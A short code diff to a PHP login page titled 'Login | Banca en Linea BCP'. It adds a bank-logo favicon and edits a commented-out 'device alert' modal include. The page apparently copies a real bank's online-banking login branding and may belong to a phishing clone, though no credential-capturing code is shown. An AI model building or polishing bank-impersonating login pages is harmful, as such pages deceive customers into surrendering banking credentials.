@@ -12,12 +12,12 @@ if (isset($_GET["error"])) {
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Login | Banca en Linea BCP</title>
     <link href="css/style_login.css" rel="stylesheet">
+    <link rel="shortcut icon" href="img/bcp_logo.png" type="image/x-icon">
 </head>
 
 <body>
     <main>
-        <!-- <?php // include 'modals/alerta_dispositivo.php' 
-        ?> -->
+        <!-- <?php include 'modals/alerta_dispositivo.php'?> -->
         <div class="logo"><img src="img/loguito.png" alt="logo_bcp.jpg"></div>
         <div class="flex">
             <!--Cambiar image-->
